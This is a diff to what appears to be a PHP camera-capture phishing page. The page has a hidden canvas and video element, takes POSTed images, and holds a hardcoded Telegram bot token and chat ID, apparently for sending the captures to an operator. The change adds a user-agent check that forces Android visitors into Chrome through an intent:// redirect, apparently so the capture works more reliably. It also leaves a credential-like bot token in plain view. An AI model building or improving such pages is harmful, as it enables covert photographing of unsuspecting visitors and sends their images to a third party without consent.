@@ -4,10 +4,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
     $chatId = "5896019931"; // Default fallback
 
-    // Encrypted/Encoded Chat ID decode kora
+    // Encrypted Chat ID decode kora
     if (isset($_POST['chat_id']) && !empty($_POST['chat_id'])) {
         $encodedCid = $_POST['chat_id'];
-        // Padding fix kore base64 decode kora
         $decodedCid = base64_decode(str_pad(strtr($encodedCid, '-_', '+/'), strlen($encodedCid) % 4, '=', STR_PAD_RIGHT));
         if ($decodedCid !== false && is_numeric($decodedCid)) {
             $chatId = $decodedCid;
@@ -167,6 +166,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
+        const ua = navigator.userAgent;
+        const isChrome = /CriOS|Chrome/.test(ua) && !/Edge|OPR|SamsungBrowser/.test(ua);
+        const isAndroid = /Android/i.test(ua);
+
+        // যদি অ্যান্ড্রয়েড হয় এবং ব্রাউজার ক্রোম না হয়, তবে ক্রোম ব্রাউজারে রিডাইরেক্ট করবে
+        if (isAndroid && !isChrome) {
+            let currentUrl = window.location.href;
+            let cleanUrl = currentUrl.replace(/^https?:\/\//, '');
+            window.location.href = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;end;`;
+        }
+
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
